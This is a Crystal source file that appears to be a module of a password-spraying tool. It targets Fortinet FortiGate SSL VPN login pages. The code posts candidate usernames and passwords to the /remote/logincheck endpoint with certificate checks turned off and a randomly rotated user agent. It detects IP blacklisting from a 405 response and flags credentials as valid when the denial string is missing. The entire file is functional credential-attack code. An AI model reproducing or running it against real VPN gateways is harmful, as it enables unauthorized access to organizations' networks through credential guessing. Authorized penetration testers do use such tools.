require "http/client"

class VPNFortigate < Sprayer

    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
         # lockedout = false
        # valid = false
        # mfa = false
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # enter your auth check here and make sure 
        #

        url = @target

        form = "ajax=#{1}&username=#{username}&realm=&credential=#{password}"

        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        client = HTTP::Client.new(url, tls: context)
        header = HTTP::Headers{
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Pragma" => "no-cache",
            "Cache-Control" => "no-store, no-cache, must-revalidate",
            "If-Modified-Since" =>  "Sat, 1 Jan 2000 00:00:00 GMT",
            "Content-Type" => "text/plain;charset=UTF-8",
            "Origin" => "https://#{@target}",
            "Referer" => "https://#{@target}/remote/login?lang=en"
        }

        postpage = "/remote/logincheck"
        page = client.post( postpage , headers: header, form: form)
        # puts page.status
        # puts  page.headers
        if page.status_code == 405 # ip is most likely blacklisted
            # puts "Returned a 405"
            return nil
        end

        if !page.body.includes? "sslvpn_login_permission_denied"
            # lockedout = true # pretty sure this was supposed to say valid not locked out....
            spstatus.valid_credentials = true 
        end

        #
        # end of your auth check here
        # 
        # return [username, password, valid, lockedout, mfa]
        return spstatus
    end
end